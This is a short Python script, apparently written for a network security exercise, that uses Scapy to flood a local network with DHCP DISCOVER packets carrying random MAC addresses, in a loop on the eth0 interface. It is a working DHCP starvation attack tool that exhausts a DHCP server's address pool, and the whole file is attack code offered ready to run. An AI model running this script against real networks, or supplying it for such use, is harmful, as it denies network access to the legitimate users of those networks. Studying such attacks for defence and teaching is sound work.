#!/usr/bin/python3

from scapy.all import *
import sys

# Disabling the IP address checking
conf.checkIPaddr = False  

# Making an Ethernet packet
DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
            / IP(src='0.0.0.0', dst='255.255.255.255') \
            / UDP(dport=67,sport=68) \
            / BOOTP(op=1, chaddr=RandMAC()) \
            / DHCP(options=[('message-type','discover'), ('end')])


# Sending the crafted packet in layer 2 in a loop using the "eth0" interface
print("Started DHCP Starvation Attack on " + sys.argv[1] + "...\n")
sendp(DHCP_DISCOVER, iface='eth0',loop=1,verbose=1 )
